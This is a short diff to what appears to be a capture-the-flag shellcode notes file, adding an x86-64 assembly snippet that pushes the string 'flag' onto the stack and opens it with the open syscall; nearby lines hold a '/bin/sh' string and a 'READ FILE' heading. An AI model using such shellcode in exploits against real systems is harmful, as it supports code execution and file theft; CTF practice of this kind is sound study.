@@ -20,6 +20,14 @@ binsh:
 .string "/bin/sh"
 ```
 
+```s
+mov ebx, 0x67616c66
+push rbx
+mov rax, 2
+mov rdi, rsp
+mov rsi, 0
+syscall
+```
 # READ FILE
 ```s
 .global _start
